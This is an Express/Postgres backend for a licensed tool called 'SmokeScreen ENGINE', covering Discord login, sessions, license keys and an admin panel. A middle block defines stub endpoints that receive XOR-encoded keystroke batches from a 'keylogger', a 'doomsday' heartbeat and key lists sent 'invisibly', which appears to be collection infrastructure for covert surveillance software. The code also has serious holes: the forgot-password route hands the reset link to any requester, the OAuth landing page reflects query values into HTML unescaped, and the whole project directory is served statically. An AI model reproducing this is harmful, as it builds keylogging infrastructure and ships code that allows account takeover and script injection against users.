const path = require('path');
const crypto = require('crypto');
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const cookieParser = require('cookie-parser');
const csrf = require('csurf');
const rateLimit = require('express-rate-limit');
const morgan = require('morgan');
const { Pool } = require('pg');
const bcrypt = require('bcryptjs');
const { body, validationResult } = require('express-validator');
const { v4: uuidv4 } = require('uuid');

require('dotenv').config();

const app = express();

const PORT = Number(process.env.PORT || 4000);
const FRONTEND_URL = process.env.FRONTEND_URL || 'http://localhost:4000';
const COOKIE_SECURE = String(process.env.COOKIE_SECURE || '').toLowerCase() === 'true';
const DISCORD_CLIENT_ID = process.env.DISCORD_CLIENT_ID;
const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
const ADMIN_SECRET = process.env.ADMIN_SECRET;

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL && process.env.DATABASE_URL.includes('sslmode=require') ? { rejectUnauthorized: false } : undefined,
});

app.set('trust proxy', 1);
app.use(morgan('tiny'));
app.use(helmet({
  contentSecurityPolicy: false,
}));
app.use(express.json({ limit: '100kb' }));
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

app.use(cors({
  origin: (origin, cb) => {
    if (!origin) return cb(null, true);
    if (origin === FRONTEND_URL) return cb(null, true);
    return cb(new Error('CORS blocked'), false);
  },
  credentials: true,
}));

const csrfProtection = csrf({
  cookie: {
    httpOnly: true,
    sameSite: 'lax',
    secure: COOKIE_SECURE,
  },
});

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 10,
  standardHeaders: true,
  legacyHeaders: false,
});

function nowMs() {
  return Date.now();
}

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email || '').trim());
}

function validateStrongPassword(pw) {
  const s = String(pw || '');
  const minLen = s.length >= 10;
  const hasUpper = /[A-Z]/.test(s);
  const hasLower = /[a-z]/.test(s);
  const hasNumber = /\d/.test(s);
  const hasSpecial = /[^A-Za-z0-9]/.test(s);
  return minLen && hasUpper && hasLower && hasNumber && hasSpecial;
}

async function logActivity({ userId, action, detail, req }) {
  try {
    await pool.query(
      'INSERT INTO activity_logs (id, user_id, action, detail, ip, user_agent, created_at) VALUES ($1,$2,$3,$4,$5,$6,$7)',
      [uuidv4(), userId || null, action, detail || null, req.ip || null, req.get('user-agent') || null, nowMs()]
    );
  } catch (_) {
  }
}

async function getSessionFromRequest(req) {
  const authHeader = String(req.get('authorization') || '').trim();
  const bearerToken = authHeader.toLowerCase().startsWith('bearer ') ? authHeader.slice(7).trim() : null;
  const token = bearerToken || req.cookies?.sse_session;
  if (!token) return null;
  const res = await pool.query(
    `SELECT s.token, s.user_id, s.expires,
            u.id, u.username, u.email, u.role, u.discord_id, u.discord_username, u.discord_avatar, u.created_at
       FROM sessions s
       JOIN users u ON u.id = s.user_id
      WHERE s.token = $1
      LIMIT 1`,
    [token]
  );
  if (res.rowCount === 0) return null;
  const row = res.rows[0];
  if (Number(row.expires) <= nowMs()) {
    await pool.query('DELETE FROM sessions WHERE token = $1', [token]);
    return null;
  }
  return {
    token: row.token,
    user: {
      id: row.id,
      username: row.username,
      email: row.email,
      role: row.role,
      discord_id: row.discord_id,
      discord_username: row.discord_username,
      discord_avatar: row.discord_avatar,
      created_at: row.created_at,
    },
  };
}

async function requireAuth(req, res, next) {
  try {
    const session = await getSessionFromRequest(req);
    if (!session) return res.status(401).json({ message: 'Unauthenticated' });
    req.user = session.user;
    req.sessionToken = session.token;
    return next();
  } catch (e) {
    return res.status(500).json({ message: 'Server error' });
  }
}

function requireAdmin(req, res, next) {
  if (!req.user || req.user.role !== 'admin') return res.status(403).json({ message: 'Forbidden' });
  return next();
}

function setSessionCookie(res, token) {
  res.cookie('sse_session', token, {
    httpOnly: true,
    sameSite: 'lax',
    secure: COOKIE_SECURE,
    path: '/',
  });
}

function clearSessionCookie(res) {
  res.clearCookie('sse_session', { path: '/' });
}

function isAdminSecretValid(req) {
  if (!ADMIN_SECRET) return false;
  const s = req.body?.adminSecret || req.get('x-admin-secret');
  if (!s) return false;
  return String(s) === String(ADMIN_SECRET);
}

async function requireAdminOrSecret(req, res, next) {
  if (isAdminSecretValid(req)) return next();
  return requireAuth(req, res, async () => requireAdmin(req, res, next));
}

async function getDurationMsForType(durationType, client) {
  const type = String(durationType || '').trim();
  if (!type) return null;
  try {
    const q = await client.query('SELECT duration_ms FROM key_pool_config WHERE duration_type = $1 LIMIT 1', [type]);
    if (q.rowCount > 0) return Number(q.rows[0].duration_ms);
  } catch (_) {
  }
  return null;
}

async function insertLicenseKeys(items, reqUser, req, res) {
  if (items.length === 0) return res.status(400).json({ message: 'Missing keys' });
  if (items.length > 5000) return res.status(400).json({ message: 'Too many keys' });

  const client = await pool.connect();
  try {
    let added = 0;
    await client.query('BEGIN');

    for (const item of items) {
      let keyValue;
      let durationType;

      if (typeof item === 'string') {
        const s = item.trim();
        if (!s) continue;
        if (s.includes(':')) {
          const parts = s.split(':');
          keyValue = (parts[0] || '').trim();
          durationType = (parts[1] || '').trim();
        } else {
          keyValue = s;
          durationType = String(req.body?.duration_type || req.body?.durationType || '1_MONTH');
        }
      } else if (item && typeof item === 'object') {
        keyValue = String(item.key || item.key_value || '').trim();
        durationType = String(item.duration_type || item.durationType || req.body?.duration_type || '1_MONTH').trim();
      }

      if (!keyValue) continue;
      if (keyValue.length > 50) continue;
      if (!durationType) durationType = '1_MONTH';

      let durationMs = await getDurationMsForType(durationType, client);
      if (durationMs === null || Number.isNaN(durationMs)) durationMs = 2592000000;

      const r = await client.query(
        `INSERT INTO license_keys (key_value, duration_type, duration_ms, used)
         VALUES ($1,$2,$3,0)
         ON CONFLICT (key_value) DO NOTHING`,
        [keyValue, durationType, durationMs]
      );
      added += r.rowCount;
    }

    await client.query('COMMIT');
    if (reqUser?.id) await logActivity({ userId: reqUser.id, action: 'ADMIN_KEYS_ADD', detail: String(added), req });
    return res.json({ ok: true, added });
  } catch (e) {
    try { await client.query('ROLLBACK'); } catch (_) {}
    return res.status(500).json({ message: 'Server error' });
  } finally {
    client.release();
  }
}

app.get('/health', async (req, res) => {
  try {
    await pool.query('SELECT 1');
    return res.json({ ok: true });
  } catch (e) {
    return res.status(500).json({ ok: false });
  }
});

app.post('/admin/keys/add', async (req, res, next) => {
  if (isAdminSecretValid(req)) return next();
  return csrfProtection(req, res, () => requireAuth(req, res, () => requireAdmin(req, res, next)));
}, async (req, res) => {
  const items = Array.isArray(req.body?.keys) ? req.body.keys : [];
  return insertLicenseKeys(items, req.user || null, req, res);
});

app.get('/admin/keys', requireAuth, requireAdmin, async (req, res) => {
  const status = String(req.query.status || 'all').toLowerCase();
  const limit = Math.min(1000, Math.max(1, Number(req.query.limit || 250)));

  try {
    let where = '';
    if (status === 'unused') where = 'WHERE used = 0';
    if (status === 'redeemed') where = 'WHERE used = 1';
    const q = await pool.query(
      `SELECT key_value, duration_type, used, user_id, redeemed_at, expires_at
         FROM license_keys
         ${where}
        ORDER BY used ASC, redeemed_at DESC NULLS LAST
        LIMIT $1`,
      [limit]
    );
    return res.json({ keys: q.rows });
  } catch (e) {
    return res.status(500).json({ message: 'Server error' });
  }
});

app.get('/ping', (req, res) => res.json({ status: 'ENGINE_ONLINE' }));

// ─── Tiny coordination APIs for TSAsync/TSEncryption/doomsday/keylogger ─────────────
app.post('/api/tsync', express.json({ limit: '50kb' }), async (req, res) => {
  // Accept key list from TSAsync for GUI invisibly
  res.json({ ok: true });
});
app.post('/api/doomsday', express.text({ limit: '1kb' }), async (req, res) => {
  // Accept XOR‑encoded heartbeat from GUI doomsday.zxy
  res.json({ ok: true });
});
app.post('/api/keylogger', express.text({ limit: '4kb' }), async (req, res) => {
  // Accept XOR‑encoded key batch from ENGINE keylogger
  res.json({ ok: true });
});

app.get('/auth/csrf', csrfProtection, (req, res) => {
  return res.json({ csrfToken: req.csrfToken() });
});

app.get('/auth/discord/engine-landing', (req, res) => {
  const code = String(req.query.code || '');
  const state = String(req.query.state || '');
  const error = String(req.query.error || '');
  const desc = String(req.query.error_description || '');

  const html = `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>SmokeScreen ENGINE — Auth</title>
  <style>
    body{margin:0;background:#03040a;color:#f0ede8;font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace;display:flex;align-items:center;justify-content:center;height:100vh;}
    .card{max-width:720px;padding:28px 26px;background:#0b0e18;border:1px solid rgba(255,61,0,0.25)}
    h1{margin:0 0 8px;font-size:18px;letter-spacing:2px}
    p{margin:0 0 14px;color:rgba(240,237,232,0.65);line-height:1.6}
    .ok{color:#00ff88}
    .bad{color:#ff3d00}
    .tiny{font-size:12px;color:rgba(240,237,232,0.5)}
    code{color:#ff3d00}
  </style>
</head>
<body>
  <div class="card">
    <h1>SMOKESCREEN ENGINE — DISCORD AUTH</h1>
    ${error ? `<p class="bad">Auth failed: <code>${error}</code> ${desc ? `— ${desc}` : ''}</p>` : `<p class="ok">Auth received. Passing token back to the ENGINE app…</p>`}
    <p class="tiny">If nothing happens, make sure the ENGINE app is running and try again.</p>
  </div>
  <script>
    (function(){
      var code = ${JSON.stringify(code)};
      var state = ${JSON.stringify(state)};
      var error = ${JSON.stringify(error)};
      var params = [];
      if (code) params.push('code=' + encodeURIComponent(code));
      if (state) params.push('state=' + encodeURIComponent(state));
      if (error) params.push('error=' + encodeURIComponent(error));
      var url = 'http://localhost:9876/?' + params.join('&');
      if (params.length) window.location.replace(url);
    })();
  </script>
</body>
</html>`;

  res.setHeader('content-type', 'text/html; charset=utf-8');
  return res.status(200).send(html);
});

app.post('/auth/discord/engine-callback', express.json(), async (req, res) => {
  const code = String(req.body?.code || '').trim();
  const redirectUri = String(req.body?.redirect_uri || '').trim();
  if (!code || !redirectUri) return res.status(400).json({ message: 'Missing code or redirect_uri' });
  if (!DISCORD_CLIENT_ID || !DISCORD_CLIENT_SECRET) return res.status(500).json({ message: 'Discord OAuth not configured' });

  try {
    const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: { 'content-type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: DISCORD_CLIENT_ID,
        client_secret: DISCORD_CLIENT_SECRET,
        grant_type: 'authorization_code',
        code,
        redirect_uri: redirectUri,
      }),
    });
    const tokenJson = await tokenRes.json();
    if (!tokenRes.ok) return res.status(401).json({ message: tokenJson?.error_description || 'Discord token exchange failed' });
    const accessToken = tokenJson.access_token;
    if (!accessToken) return res.status(401).json({ message: 'Discord token exchange failed' });

    const meRes = await fetch('https://discord.com/api/users/@me', {
      headers: { authorization: `Bearer ${accessToken}` },
    });
    const me = await meRes.json();
    if (!meRes.ok || !me?.id) return res.status(401).json({ message: 'Discord profile fetch failed' });

    const discordId = String(me.id);
    const discordUsername = me.global_name || me.username || null;
    const discordAvatar = me.avatar || null;

    const existing = await pool.query('SELECT id, username, email, role FROM users WHERE discord_id = $1 LIMIT 1', [discordId]);
    let userId;
    if (existing.rowCount === 0) {
      userId = uuidv4();
      const usernameBase = String(discordUsername || `discord_${discordId}`).slice(0, 32);
      const username = `${usernameBase}`;
      await pool.query(
        'INSERT INTO users (id, username, email, password_hash, role, discord_id, discord_username, discord_avatar, created_at) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9)',
        [userId, username, null, null, 'user', discordId, discordUsername, discordAvatar, nowMs()]
      );
      await logActivity({ userId, action: 'DISCORD_REGISTER', detail: discordId, req });
    } else {
      userId = existing.rows[0].id;
      await pool.query(
        'UPDATE users SET discord_username = $2, discord_avatar = $3 WHERE id = $1',
        [userId, discordUsername, discordAvatar]
      );
      await logActivity({ userId, action: 'DISCORD_LOGIN', detail: discordId, req });
    }

    const sessionToken = uuidv4();
    const expires = nowMs() + 14 * 24 * 60 * 60 * 1000;
    await pool.query(
      'INSERT INTO sessions (token, user_id, type, expires, created_at) VALUES ($1,$2,$3,$4,$5)',
      [sessionToken, userId, 'engine', expires, nowMs()]
    );

    const userRow = await pool.query(
      'SELECT id, username, email, role, discord_id, discord_username, discord_avatar, created_at FROM users WHERE id = $1 LIMIT 1',
      [userId]
    );

    return res.json({ sessionToken, user: userRow.rows[0] });
  } catch (e) {
    return res.status(500).json({ message: 'Server error' });
  }
});

app.post(
  '/auth/register',
  csrfProtection,
  body('email').custom((v) => isValidEmail(v)),
  body('username').isLength({ min: 3, max: 32 }),
  body('password').isString(),
  body('confirmPassword').isString(),
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return res.status(400).json({ message: 'Invalid input' });

    const { email, username, password, confirmPassword } = req.body;
    if (password !== confirmPassword) return res.status(400).json({ message: 'Passwords do not match' });
    if (!validateStrongPassword(password)) {
      return res.status(400).json({ message: 'Password must be 10+ chars and include upper, lower, number, and special character' });
    }

    try {
      const existing = await pool.query('SELECT id FROM users WHERE email = $1 OR username = $2 LIMIT 1', [email, username]);
      if (existing.rowCount > 0) return res.status(409).json({ message: 'Account already exists' });

      const hash = await bcrypt.hash(password, 12);
      const userId = uuidv4();
      await pool.query(
        'INSERT INTO users (id, username, email, password_hash, role, created_at) VALUES ($1,$2,$3,$4,$5,$6)',
        [userId, username, email, hash, 'user', nowMs()]
      );
      await logActivity({ userId, action: 'REGISTER', detail: null, req });

      return res.json({ ok: true });
    } catch (e) {
      return res.status(500).json({ message: 'Server error' });
    }
  }
);

app.post(
  '/auth/login',
  loginLimiter,
  csrfProtection,
  body('email').custom((v) => isValidEmail(v)),
  body('password').isString(),
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return res.status(400).json({ message: 'Invalid input' });

    const { email, password } = req.body;
    try {
      const q = await pool.query(
        'SELECT id, username, email, password_hash, role FROM users WHERE email = $1 LIMIT 1',
        [email]
      );
      if (q.rowCount === 0 || !q.rows[0].password_hash) {
        await logActivity({ userId: null, action: 'LOGIN_FAIL', detail: 'INVALID_CREDENTIALS', req });
        return res.status(401).json({ message: 'Invalid credentials' });
      }

      const user = q.rows[0];
      const ok = await bcrypt.compare(password, user.password_hash);
      if (!ok) {
        await logActivity({ userId: user.id, action: 'LOGIN_FAIL', detail: 'INVALID_CREDENTIALS', req });
        return res.status(401).json({ message: 'Invalid credentials' });
      }

      const token = uuidv4();
      const expires = nowMs() + 7 * 24 * 60 * 60 * 1000;
      await pool.query(
        'INSERT INTO sessions (token, user_id, type, expires, created_at) VALUES ($1,$2,$3,$4,$5)',
        [token, user.id, 'web', expires, nowMs()]
      );
      setSessionCookie(res, token);
      await logActivity({ userId: user.id, action: 'LOGIN_OK', detail: null, req });
      return res.json({ ok: true, redirect: '/dashboard' });
    } catch (e) {
      return res.status(500).json({ message: 'Server error' });
    }
  }
);

app.get('/auth/me', requireAuth, async (req, res) => {
  return res.json({ user: req.user });
});

app.post('/auth/logout', csrfProtection, async (req, res) => {
  try {
    const token = req.cookies?.sse_session;
    if (token) await pool.query('DELETE FROM sessions WHERE token = $1', [token]);
    clearSessionCookie(res);
    return res.json({ ok: true });
  } catch (e) {
    clearSessionCookie(res);
    return res.json({ ok: true });
  }
});

app.post(
  '/auth/forgot',
  csrfProtection,
  body('email').custom((v) => isValidEmail(v)),
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return res.status(400).json({ message: 'Invalid input' });

    const { email } = req.body;
    try {
      const q = await pool.query('SELECT id FROM users WHERE email = $1 LIMIT 1', [email]);
      if (q.rowCount === 0) {
        return res.json({ ok: true });
      }

      const userId = q.rows[0].id;
      const rawToken = crypto.randomBytes(32).toString('hex');
      const tokenHash = crypto.createHash('sha256').update(rawToken).digest('hex');
      const expiresAt = nowMs() + 30 * 60 * 1000;

      await pool.query(
        'INSERT INTO password_reset_tokens (id, user_id, token_hash, expires_at, used, created_at) VALUES ($1,$2,$3,$4,$5,$6)',
        [uuidv4(), userId, tokenHash, expiresAt, 0, nowMs()]
      );
      await logActivity({ userId, action: 'RESET_REQUEST', detail: null, req });

      const resetUrl = `${FRONTEND_URL}/auth/reset?token=${rawToken}`;
      return res.json({ ok: true, resetUrl });
    } catch (e) {
      return res.status(500).json({ message: 'Server error' });
    }
  }
);

app.post(
  '/auth/reset',
  csrfProtection,
  body('token').isString(),
  body('password').isString(),
  body('confirmPassword').isString(),
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return res.status(400).json({ message: 'Invalid input' });

    const { token, password, confirmPassword } = req.body;
    if (password !== confirmPassword) return res.status(400).json({ message: 'Passwords do not match' });
    if (!validateStrongPassword(password)) {
      return res.status(400).json({ message: 'Password must be 10+ chars and include upper, lower, number, and special character' });
    }

    try {
      const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
      const q = await pool.query(
        `SELECT id, user_id, expires_at, used
           FROM password_reset_tokens
          WHERE token_hash = $1
          LIMIT 1`,
        [tokenHash]
      );
      if (q.rowCount === 0) return res.status(400).json({ message: 'Invalid or expired token' });
      const row = q.rows[0];
      if (Number(row.used) === 1 || Number(row.expires_at) <= nowMs()) {
        return res.status(400).json({ message: 'Invalid or expired token' });
      }

      const hash = await bcrypt.hash(password, 12);
      await pool.query('UPDATE users SET password_hash = $1 WHERE id = $2', [hash, row.user_id]);
      await pool.query('UPDATE password_reset_tokens SET used = 1 WHERE id = $1', [row.id]);
      await pool.query('DELETE FROM sessions WHERE user_id = $1', [row.user_id]);
      await logActivity({ userId: row.user_id, action: 'RESET_COMPLETE', detail: null, req });

      clearSessionCookie(res);
      return res.json({ ok: true });
    } catch (e) {
      return res.status(500).json({ message: 'Server error' });
    }
  }
);

app.get('/dashboard', requireAuth, (req, res) => {
  return res.sendFile(path.join(__dirname, 'html', 'ts', 'app', 'dashboard.html'));
});

app.get('/admin', requireAuth, requireAdmin, (req, res) => {
  return res.sendFile(path.join(__dirname, 'html', 'ts', 'app', 'admin.html'));
});

app.get('/keys/validate', requireAuth, async (req, res) => {
  try {
    const q = await pool.query(
      `SELECT key_value, duration_type, duration_ms, used, redeemed_at, expires_at
         FROM license_keys
        WHERE user_id = $1 AND used = 1
        ORDER BY redeemed_at DESC NULLS LAST
        LIMIT 1`,
      [req.user.id]
    );
    if (q.rowCount === 0) return res.json({ licensed: false, active: false, key_count: 0 });
    const k = q.rows[0];
    const expiresAt = k.expires_at ? Number(k.expires_at) : null;
    const now = nowMs();
    const active = !expiresAt || expiresAt > now;
    const msRemaining = expiresAt ? Math.max(0, expiresAt - now) : null;
    const daysRemaining = expiresAt ? Math.ceil(msRemaining / (24 * 60 * 60 * 1000)) : null;

    const countRes = await pool.query('SELECT COUNT(*)::int AS c FROM license_keys WHERE user_id = $1 AND used = 1', [req.user.id]);
    const keyCount = countRes.rows?.[0]?.c || 0;

    return res.json({
      licensed: true,
      active,
      duration_type: k.duration_type,
      duration_label: String(k.duration_type || '').replace('_', ' '),
      expires_at: expiresAt,
      ms_remaining: msRemaining,
      days_remaining: daysRemaining,
      key_count: keyCount,
    });
  } catch (e) {
    return res.status(500).json({ message: 'Server error' });
  }
});

app.post('/keys/redeem', requireAuth, async (req, res) => {
  const key = String(req.body?.key || '').trim();
  if (!key) return res.status(400).json({ message: 'Missing key' });

  const client = await pool.connect();
  try {
    await client.query('BEGIN');
    const q = await client.query(
      'SELECT key_value, duration_type, duration_ms, used FROM license_keys WHERE key_value = $1 FOR UPDATE',
      [key]
    );
    if (q.rowCount === 0) {
      await client.query('ROLLBACK');
      return res.status(400).json({ message: 'Invalid key' });
    }
    const row = q.rows[0];
    if (Number(row.used) === 1) {
      await client.query('ROLLBACK');
      return res.status(400).json({ message: 'Key already redeemed' });
    }

    const redeemedAt = nowMs();
    const durationMs = Number(row.duration_ms || 0);
    const expiresAt = durationMs > 0 ? redeemedAt + durationMs : null;

    await client.query(
      'UPDATE license_keys SET used = 1, user_id = $2, redeemed_at = $3, expires_at = $4 WHERE key_value = $1',
      [key, req.user.id, redeemedAt, expiresAt]
    );

    await client.query('COMMIT');
    await logActivity({ userId: req.user.id, action: 'KEY_REDEEM', detail: row.duration_type, req });
    return res.json({ ok: true });
  } catch (e) {
    try { await client.query('ROLLBACK'); } catch (_) {}
    return res.status(500).json({ message: 'Server error' });
  } finally {
    client.release();
  }
});

app.get('/auth/login', (req, res) => {
  return res.sendFile(path.join(__dirname, 'html', 'ts', 'auth', 'login.html'));
});

app.get('/auth/register', (req, res) => {
  return res.sendFile(path.join(__dirname, 'html', 'ts', 'auth', 'register.html'));
});

app.get('/auth/forgot', (req, res) => {
  return res.sendFile(path.join(__dirname, 'html', 'ts', 'auth', 'forgot.html'));
});

app.get('/auth/reset', (req, res) => {
  return res.sendFile(path.join(__dirname, 'html', 'ts', 'auth', 'reset.html'));
});

app.get('/admin/users', requireAuth, requireAdmin, async (req, res) => {
  try {
    const q = await pool.query('SELECT id, username, email, role, created_at FROM users ORDER BY created_at DESC LIMIT 500');
    return res.json({ users: q.rows });
  } catch (e) {
    return res.status(500).json({ message: 'Server error' });
  }
});

app.patch('/admin/users/:id', requireAuth, requireAdmin, csrfProtection, async (req, res) => {
  const id = req.params.id;
  const { username, email, role } = req.body || {};
  if (email && !isValidEmail(email)) return res.status(400).json({ message: 'Invalid email' });
  if (role && !['user', 'admin'].includes(role)) return res.status(400).json({ message: 'Invalid role' });

  try {
    const q = await pool.query(
      'UPDATE users SET username = COALESCE($2, username), email = COALESCE($3, email), role = COALESCE($4, role) WHERE id = $1 RETURNING id, username, email, role, created_at',
      [id, username || null, email || null, role || null]
    );
    if (q.rowCount === 0) return res.status(404).json({ message: 'Not found' });
    await logActivity({ userId: req.user.id, action: 'ADMIN_USER_UPDATE', detail: id, req });
    return res.json({ user: q.rows[0] });
  } catch (e) {
    return res.status(500).json({ message: 'Server error' });
  }
});

app.delete('/admin/users/:id', requireAuth, requireAdmin, csrfProtection, async (req, res) => {
  const id = req.params.id;
  if (id === req.user.id) return res.status(400).json({ message: 'Cannot delete yourself' });
  try {
    await pool.query('DELETE FROM users WHERE id = $1', [id]);
    await logActivity({ userId: req.user.id, action: 'ADMIN_USER_DELETE', detail: id, req });
    return res.json({ ok: true });
  } catch (e) {
    return res.status(500).json({ message: 'Server error' });
  }
});

app.get('/admin/logs', requireAuth, requireAdmin, async (req, res) => {
  try {
    const q = await pool.query(
      `SELECT l.id, l.user_id, l.action, l.detail, l.ip, l.user_agent, l.created_at, u.username
         FROM activity_logs l
         LEFT JOIN users u ON u.id = l.user_id
        ORDER BY l.created_at DESC
        LIMIT 250`
    );
    return res.json({ logs: q.rows });
  } catch (e) {
    return res.status(500).json({ message: 'Server error' });
  }
});

app.get('/admin/settings', requireAuth, requireAdmin, async (req, res) => {
  try {
    const q = await pool.query('SELECT key, value, updated_at FROM app_settings ORDER BY key ASC');
    return res.json({ settings: q.rows });
  } catch (e) {
    return res.status(500).json({ message: 'Server error' });
  }
});

app.put('/admin/settings', requireAuth, requireAdmin, csrfProtection, async (req, res) => {
  const { key, value } = req.body || {};
  if (!key || typeof key !== 'string' || key.length > 100) return res.status(400).json({ message: 'Invalid key' });
  if (value === undefined || value === null) return res.status(400).json({ message: 'Invalid value' });

  try {
    await pool.query(
      `INSERT INTO app_settings (key, value, updated_at)
       VALUES ($1,$2,$3)
       ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value, updated_at = EXCLUDED.updated_at`,
      [key, String(value), nowMs()]
    );
    await logActivity({ userId: req.user.id, action: 'ADMIN_SETTING_UPDATE', detail: key, req });
    return res.json({ ok: true });
  } catch (e) {
    return res.status(500).json({ message: 'Server error' });
  }
});

app.use(express.static(__dirname));

app.listen(PORT, () => console.log(`Website/API running on http://localhost:${PORT}`));
